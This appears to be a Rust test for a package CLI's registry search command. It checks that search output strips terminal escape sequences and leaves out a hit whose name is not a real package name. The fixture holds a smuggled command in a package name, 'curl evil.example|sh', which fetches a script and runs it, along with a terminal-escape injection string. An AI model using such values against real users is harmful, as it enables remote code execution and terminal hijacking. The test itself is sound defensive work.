//! What a registry's search reply may write to the terminal (ADR 0231).
#![allow(
    clippy::unwrap_used,
    reason = "a test's unwrap is its assertion: a None or an Err fails the test"
)]

use crate::support::Cli;
use crate::support::registry::project_on;
use specforge_registry_server::testing::LocalRegistry;
use specforge_test_macros::test as specforge_test;

const HOSTILE_NAME: &str = "@sdk/greet; curl evil.example|sh";
const ODD: &str = "nice \u{1b}[2J\u{1b}]0;pwned\u{7}";

/// A registry holding a hit that is no package name and `@sdk/good` described as [`ODD`].
fn serve_hostile() -> LocalRegistry {
    let registry = LocalRegistry::start();
    for (name, version, description) in [(HOSTILE_NAME, "9.9.9", "x"), ("@sdk/good", "1.0.0", ODD)]
    {
        let manifest = serde_json::json!({"handshake": {
            "protocol_version": "1.0.0", "name": name, "version": version,
            "description": description, "peer_dependencies": [], "sandbox_policy": null,
        }})
        .to_string();
        let metadata =
            specforge_registry_client::testing::package(name, version, b"\0asm", &manifest, None);
        registry.store(&metadata, b"\0asm");
    }
    registry
}

#[ignore = "flipped by T5"]
#[specforge_test(
    behavior = "search_registry",
    verify = "a hit's description is listed printable, each control character as its escape"
)]
fn search_writes_no_registry_control_character_and_no_hit_that_is_no_package_name() {
    let registry = serve_hostile();
    let dir = project_on(&registry);

    let output = Cli::on(&dir).command(&["search", "sdk"]).output().unwrap();

    assert!(output.status.success(), "{output:?}");
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(!stdout.contains(['\u{1b}', '\u{7}']), "{stdout:?}");
    assert!(!stdout.contains("curl evil.example"), "{stdout}");
    assert!(stdout.contains("@sdk/good v1.0.0"), "{stdout}");
    assert!(stdout.contains("nice \\u{1b}[2J"), "{stdout}");

    let output = Cli::on(&dir)
        .command(&["search", "sdk", "--format", "json"])
        .output()
        .unwrap();
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let names: Vec<&str> = json["results"]
        .as_array()
        .unwrap()
        .iter()
        .map(|hit| hit["name"].as_str().unwrap())
        .collect();
    assert_eq!(names, ["@sdk/good"]);
    assert_eq!(
        json["results"][0]["description"],
        "nice \\u{1b}[2J\\u{1b}]0;pwned\\u{7}"
    );
}
